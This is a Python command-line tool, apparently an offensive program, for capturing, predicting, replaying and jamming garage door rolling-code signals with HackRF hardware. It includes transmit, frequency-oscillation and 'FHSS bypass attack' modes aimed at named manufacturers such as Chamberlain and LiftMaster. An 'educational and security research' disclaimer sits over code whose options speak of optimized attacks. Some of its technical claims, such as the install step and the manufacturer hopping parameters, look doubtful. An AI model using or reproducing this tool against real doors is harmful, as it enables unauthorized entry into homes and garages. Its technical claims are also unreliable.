#!/usr/bin/env python3
"""
Garage Door Rolling Code Analysis Tool with HackRF

This script provides functionality for analyzing and experimenting with garage
door rolling code systems through frequency analysis and signal manipulation
using HackRF hardware. No simulation mode available.

REQUIRES physical HackRF hardware to function. This tool will not work without
a connected HackRF One or compatible device.

For educational and security research purposes only.
"""

import sys
import argparse
import logging
import os
from datetime import datetime

# Check if this is just a request to list manufacturers
# We need to do this early to avoid HackRF import error when just listing manufacturers
if '--list-manufacturers' in sys.argv:
    # Import only what's needed
    from manufacturer_info import MANUFACTURER_INFO
    print("\nSupported Manufacturers and Frequencies:")
    print("=" * 50)
    for name, info_class in MANUFACTURER_INFO.items():
        freqs = [f"{f/1e6:.2f} MHz" for f in info_class.frequencies]
        mods = info_class.modulation
        print(f"{info_class.name}:")
        print(f"  Frequencies: {', '.join(freqs)}")
        print(f"  Modulation: {mods}")
        print(f"  Code Length: {', '.join(str(cl) for cl in info_class.code_lengths)} bits")
        print("-" * 50)
    sys.exit(0)

# Check for required HackRF hardware package
try:
    import hackrf
except ImportError:
    print("ERROR: HackRF module not installed or HackRF hardware not detected.")
    print("This tool requires actual HackRF hardware to function and has no simulation mode.")
    print("Please install the HackRF module and connect your HackRF device:")
    print("  1. Install hackrf: pip install hackrf")
    print("  2. Connect your HackRF One device")
    print("  3. Ensure you have the proper USB drivers installed")
    sys.exit(1)
from flask import Flask, render_template, request, jsonify

from rolling_code import RollingCodeAnalyzer
from signal_processor import SignalProcessor
from frequency_handler import FrequencyHandler
from code_predictor import CodePredictor
from manufacturer_handlers import (
    get_handler_for_frequency,
    get_handler_by_name,
    ManufacturerHandler,
    MANUFACTURER_HANDLERS
)
from utils import setup_logging, validate_frequency

# Create Flask app
app = Flask(__name__)
app.secret_key = os.environ.get("SESSION_SECRET", "hackrf_garage_analyzer_secret")

def parse_arguments():
    """Parse command line arguments."""
    parser = argparse.ArgumentParser(
        description='Garage Door Rolling Code Analysis Tool',
        formatter_class=argparse.ArgumentDefaultsHelpFormatter
    )
    
    # Main options
    parser.add_argument('-f', '--frequency', type=float, default=315.0,
                        help='Target frequency in MHz (typically 300-400 MHz)')
    parser.add_argument('-m', '--mode', choices=['analyze', 'predict', 'transmit', 'scan', 'oscillate', 'fhss'],
                        default='analyze', help='Operation mode (requires HackRF hardware)')
    parser.add_argument('-t', '--timeout', type=int, default=30,
                        help='Timeout in seconds for capture operations')
    parser.add_argument('--tx-gain', type=float, default=20.0,
                        help='Transmitter gain (0-47 dB, for transmit and oscillate modes)')
    
    # Input and output options
    parser.add_argument('-i', '--input', type=str, help='Input signal file (if not capturing live)')
    parser.add_argument('-o', '--output', type=str, help='Output file for captured data')
    parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose output')
    
    # Advanced options
    parser.add_argument('--bandwidth', type=float, default=2.0, help='Signal bandwidth in MHz')
    parser.add_argument('--gain', type=float, default=20.0, help='Receiver gain')
    parser.add_argument('--sample-rate', type=float, default=2.0, help='Sample rate in MHz')
    parser.add_argument('--code-length', type=int, default=32, help='Rolling code bit length')
    parser.add_argument('--attempts', type=int, default=10, help='Number of code prediction attempts')
    
    # Manufacturer-specific options
    manufacturer_choices = list(MANUFACTURER_HANDLERS.keys())
    parser.add_argument('--manufacturer', type=str, choices=manufacturer_choices,
                        help='Specify manufacturer for optimized attacks')
    parser.add_argument('--list-manufacturers', action='store_true',
                        help='List supported manufacturers and their frequencies')
    
    return parser.parse_args()

def main():
    """Main entry point for the application."""
    args = parse_arguments()
    
    # Setup logging based on verbosity
    log_level = logging.DEBUG if args.verbose else logging.INFO
    setup_logging(log_level)
    
    logging.info("Starting Garage Door Rolling Code Analysis Tool")
    
    # List manufacturers if requested
    if args.list_manufacturers:
        from manufacturer_info import MANUFACTURER_INFO
        print("\nSupported Manufacturers and Frequencies:")
        print("=" * 50)
        for name, info_class in MANUFACTURER_INFO.items():
            freqs = [f"{f/1e6:.2f} MHz" for f in info_class.frequencies]
            mods = info_class.modulation
            print(f"{info_class.name}:")
            print(f"  Frequencies: {', '.join(freqs)}")
            print(f"  Modulation: {mods}")
            print(f"  Code Length: {', '.join(str(cl) for cl in info_class.code_lengths)} bits")
            print("-" * 50)
        sys.exit(0)
    
    logging.info(f"Mode: {args.mode}")
    
    # Validate frequency
    if not validate_frequency(args.frequency):
        logging.error(f"Invalid frequency: {args.frequency} MHz. Must be between 300-400 MHz.")
        sys.exit(1)
        
    # Get manufacturer handler if specified
    manufacturer_handler = None
    if args.manufacturer:
        manufacturer_handler = get_handler_by_name(args.manufacturer, args.frequency * 1e6)
        logging.info(f"Using manufacturer-specific handler: {manufacturer_handler.name}")
    else:
        manufacturer_handler = get_handler_for_frequency(args.frequency * 1e6)
        logging.info(f"Detected manufacturer: {manufacturer_handler.name} for frequency {args.frequency} MHz")
    
    # Initialize components
    signal_processor = SignalProcessor(
        sample_rate=args.sample_rate * 1e6,  # Convert to Hz
        gain=args.gain
    )
    
    frequency_handler = FrequencyHandler(
        center_freq=args.frequency * 1e6,  # Convert to Hz
        bandwidth=args.bandwidth * 1e6     # Convert to Hz
    )
    
    code_analyzer = RollingCodeAnalyzer(
        code_length=args.code_length
    )
    
    code_predictor = CodePredictor(
        attempts=args.attempts
    )
    
    try:
        # Execute the selected mode
        if args.mode == 'analyze':
            logging.info(f"Analyzing signals at {args.frequency} MHz")
            
            if args.input:
                # Analyze from file
                logging.info(f"Loading signal data from {args.input}")
                signal_data = signal_processor.load_signal(args.input)
            else:
                # Capture live
                logging.info(f"Capturing live signals for {args.timeout} seconds")
                signal_data = signal_processor.capture_signal(
                    frequency_handler, 
                    duration=args.timeout
                )
                
                # Save captured data if output file specified
                if args.output:
                    signal_processor.save_signal(signal_data, args.output)
                    logging.info(f"Saved captured signal to {args.output}")
            
            # Analyze the captured signal
            codes = code_analyzer.extract_codes(signal_data)
            logging.info(f"Extracted {len(codes)} potential rolling codes")
            
            for i, code in enumerate(codes):
                logging.info(f"Code {i+1}: {code}")
                
            # Visualize if in verbose mode
            if args.verbose:
                signal_processor.visualize_signal(signal_data)
                
        elif args.mode == 'predict':
            logging.info("Predicting possible next rolling codes")
            
            # Load previous codes from file or capture
            if args.input:
                signal_data = signal_processor.load_signal(args.input)
                codes = code_analyzer.extract_codes(signal_data)
            else:
                logging.error("Prediction mode requires input file with previous codes")
                sys.exit(1)
                
            if len(codes) < 2:
                logging.error("Need at least 2 rolling codes to predict next codes")
                sys.exit(1)
                
            # Predict next codes
            next_codes = code_predictor.predict_next_codes(codes)
            logging.info(f"Predicted {len(next_codes)} possible next codes")
            
            for i, code in enumerate(next_codes):
                logging.info(f"Predicted code {i+1}: {code}")
                
        elif args.mode == 'transmit':
            logging.info(f"Transmitting signal at {args.frequency} MHz using HackRF hardware")
            
            if not args.input:
                logging.error("Transmit mode requires input file with code data")
                sys.exit(1)
                
            # Load code from file
            with open(args.input, 'r') as f:
                code = f.read().strip()
                
            logging.info(f"Transmitting code: {code}")
            
            # Transmit signal using HackRF
            success = frequency_handler.transmit_signal(
                code=code,
                modulation='OOK',  # On-Off Keying is most common for garage doors
                sample_rate=args.sample_rate * 1e6,
                repeat_count=5,    # Repeat transmission 5 times
                tx_gain=args.tx_gain
            )
            
            if success:
                logging.info("Transmission completed successfully")
            else:
                logging.error("Transmission failed")
                
        elif args.mode == 'oscillate':
            logging.info(f"Performing frequency oscillation around {args.frequency} MHz using HackRF")
            
            # Get optimal attack parameters for manufacturer
            attack_params = manufacturer_handler.get_optimal_attack_parameters()
            
            # Generate oscillating signal parameters
            bandwidth = args.bandwidth * 1e6  # Convert to Hz
            oscillation_rate = attack_params.get("oscillation_rate", 10.0)  # Use manufacturer-specific rate if available
            oscillation_pattern = attack_params.get("oscillation_pattern", "sinusoidal")
            duration = args.timeout  # Use timeout parameter for duration
            sample_rate = args.sample_rate * 1e6
            
            logging.info(f"Using manufacturer-specific parameters for {manufacturer_handler.name}")
            logging.info(f"Oscillation parameters: bandwidth={args.bandwidth} MHz, "
                        f"rate={oscillation_rate} Hz, pattern={oscillation_pattern}, duration={duration} s")
            
            # Generate oscillating signal
            signal = frequency_handler.oscillate_frequency(
                center_freq=args.frequency * 1e6,
                bandwidth=bandwidth,
                oscillation_rate=oscillation_rate,
                duration=duration,
                sample_rate=sample_rate,
                pattern=oscillation_pattern  # Use manufacturer-specific pattern
            )
            
            # Save signal if output requested
            if args.output:
                signal_processor.save_signal(signal, args.output)
                logging.info(f"Saved oscillation signal to {args.output}")
                
            # Transmit the oscillating signal using the C transmitter if HackRF is available
            logging.info("Transmitting oscillation signal via HackRF...")
            # This would call the actual HackRF transmission code or binary
            try:
                import subprocess
                cmd = [
                    './transmitter',
                    '-f', str(int(args.frequency * 1e6)),
                    '-m', 'oscillate',
                    '-r', str(int(oscillation_rate)),
                    '-b', str(int(bandwidth)),
                    '-d', str(int(duration)),
                    '-g', str(int(args.tx_gain)),
                    '-p', oscillation_pattern
                ]
                
                logging.info(f"Executing: {' '.join(cmd)}")
                subprocess.run(cmd, check=True)
                logging.info("Oscillation transmission completed")
            except Exception as e:
                logging.error(f"Failed to transmit oscillation: {e}")
                logging.error("Ensure the transmitter binary is compiled with 'bash compile_transmitter.sh'")
                
        elif args.mode == 'scan':
            logging.info("Scanning for active garage door frequencies")
            
            # Scan common frequencies
            frequencies = [315.0, 390.0, 433.92]
            logging.info(f"Scanning common frequencies: {frequencies} MHz")
            
            for freq in frequencies:
                logging.info(f"Scanning {freq} MHz...")
                frequency_handler.set_frequency(freq * 1e6)  # Convert to Hz
                
                # Capture for a short duration
                signal_data = signal_processor.capture_signal(
                    frequency_handler, 
                    duration=5  # Short duration for scanning
                )
                
                # Check signal strength
                strength = signal_processor.analyze_signal_strength(signal_data)
                logging.info(f"Signal strength at {freq} MHz: {strength} dB")
                
                if strength > -50:  # Arbitrary threshold
                    logging.info(f"Strong signal detected at {freq} MHz!")
                    
        elif args.mode == 'fhss':
            logging.info(f"Starting FHSS (Frequency Hopping Spread Spectrum) analysis/attack at {args.frequency} MHz")
            
            # Check if we're dealing with a manufacturer known to use FHSS
            is_fhss_manufacturer = False
            if manufacturer_handler:
                manufacturer_name = manufacturer_handler.name.lower()
                fhss_manufacturers = ["security+", "security plus", "chamberlain", "liftmaster", "faac", "marantec"]
                
                for fhss_name in fhss_manufacturers:
                    if fhss_name in manufacturer_name:
                        is_fhss_manufacturer = True
                        logging.info(f"Detected FHSS-capable manufacturer: {manufacturer_handler.name}")
                        break
            
            if not is_fhss_manufacturer:
                logging.warning(f"Current manufacturer {manufacturer_handler.name} may not use FHSS")
                logging.warning("Continuing anyway, but detection may not be accurate")
            
            # Define FHSS parameters based on manufacturer
            hop_bandwidth = 10.0  # Default bandwidth in MHz
            num_channels = 50     # Default number of channels
            
            if is_fhss_manufacturer:
                # Adjust parameters based on manufacturer
                if "chamberlain" in manufacturer_name or "liftmaster" in manufacturer_name:
                    hop_bandwidth = 4.0
                    num_channels = 16
                elif "faac" in manufacturer_name:
                    hop_bandwidth = 8.0
                    num_channels = 32
                elif "marantec" in manufacturer_name:
                    hop_bandwidth = 2.0
                    num_channels = 8
            
            try:
                # Import the FHSS module
                try:
                    from fhss_bypass import FHSSBypass
                    logging.info("FHSS bypass module loaded successfully")
                except ImportError as e:
                    logging.error(f"Failed to import FHSS bypass module: {e}")
                    logging.info("Ensure fhss_bypass.py is in the current directory")
                    sys.exit(1)
                
                # Initialize the FHSS bypass object
                bypass = FHSSBypass(
                    target_frequency=args.frequency * 1e6,  # Convert to Hz
                    hop_bandwidth=hop_bandwidth * 1e6,      # Convert to Hz
                    num_channels=num_channels
                )
                
                # Perform analysis
                logging.info("Starting FHSS system analysis...")
                analysis_duration = args.timeout  # Use timeout parameter for analysis duration
                
                results = bypass.analyze_target(scan_duration=analysis_duration)
                
                if results["success"]:
                    logging.info("FHSS analysis completed successfully")
                    logging.info(f"Device type: {results['device_type']}")
                    logging.info(f"Hop sequence: {results['hop_sequence'][:10]}...")
                    logging.info(f"Hop rate: {results['hop_rate']:.2f} hops/second")
                    
                    # If we have an input file with codes, perform an attack
                    if args.input:
                        codes = []
                        try:
                            with open(args.input, 'r') as f:
                                codes = [line.strip() for line in f.readlines() if line.strip()]
                            
                            if not codes:
                                logging.error("No valid codes found in input file")
                                sys.exit(1)
                            
                            logging.info(f"Loaded {len(codes)} codes from {args.input}")
                            logging.info("Starting FHSS bypass attack...")
                            
                            result = bypass.execute_rolling_attack(
                                codes=codes,
                                attack_duration=args.timeout
                            )
                            
                            if result:
                                logging.info("FHSS bypass attack completed successfully")
                            else:
                                logging.error("FHSS bypass attack failed")
                                
                        except Exception as e:
                            logging.error(f"Error during FHSS attack: {e}")
                    else:
                        logging.info("No input file specified for code transmission")
                        logging.info("To perform an attack, specify a file with rolling codes using the -i/--input parameter")
                else:
                    logging.error(f"FHSS analysis failed: {results['message']}")
                    logging.error("Make sure the garage door remote is actively transmitting during analysis")
                    
            except Exception as e:
                logging.error(f"Error during FHSS operations: {e}")
                if args.verbose:
                    import traceback
                    traceback.print_exc()
                    
    except KeyboardInterrupt:
        logging.info("Operation interrupted by user")
    except Exception as e:
        logging.error(f"Error: {e}")
        if args.verbose:
            import traceback
            traceback.print_exc()
        
    logging.info("Operation completed")

if __name__ == "__main__":
    main()
